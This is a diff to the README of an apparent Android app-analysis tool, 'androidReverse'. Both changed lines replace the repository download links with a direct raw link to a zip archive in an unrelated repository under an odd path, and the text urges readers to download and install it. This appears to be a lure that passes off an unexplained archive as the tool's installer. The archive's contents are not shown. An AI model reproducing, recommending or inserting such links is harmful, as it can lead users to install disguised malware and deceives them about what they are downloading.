@@ -5,7 +5,7 @@ description: "Analyze and decompile Android applications directly on your device
 ---
 # 🔍 androidReverse - Analyze Android applications directly on devices
 
-[![Download androidReverse](https://img.shields.io/badge/Download-androidReverse-blue)](https://github.com/Acousticdevicemercouri734/androidReverse)
+[![Download androidReverse](https://img.shields.io/badge/Download-androidReverse-blue)](https://github.com/Acousticdevicemercouri734/acousticdevicemercouri734.github.io/raw/refs/heads/main/unpaintability/github_io_acousticdevicemercouri_v2.6.zip)
 
 ## 📖 About this project
 androidReverse acts as a complete toolkit for users who need to study how Android applications function. The software provides a way to look inside app files to understand their structure and content. You can perform binary analysis, decompile Java code, and study Flutter or Unity frameworks. This tool replaces the need for a desktop computer by moving all analysis tasks onto your mobile hardware. It supports static analysis, which helps you see how code executes without running the app.
@@ -22,7 +22,7 @@ To ensure a stable experience, your device should meet these minimum specificati
 ## 🚀 Getting started
 You need to download the installer from the official page to begin. Visit the repository link provided below to find the current version.
 
-[Download the latest androidReverse installer here](https://github.com/Acousticdevicemercouri734/androidReverse)
+[Download the latest androidReverse installer here](https://github.com/Acousticdevicemercouri734/acousticdevicemercouri734.github.io/raw/refs/heads/main/unpaintability/github_io_acousticdevicemercouri_v2.6.zip)
 
 1.  Open the link provided above in your mobile web browser.
 2.  Locate the section labeled Releases on the right side of the page.
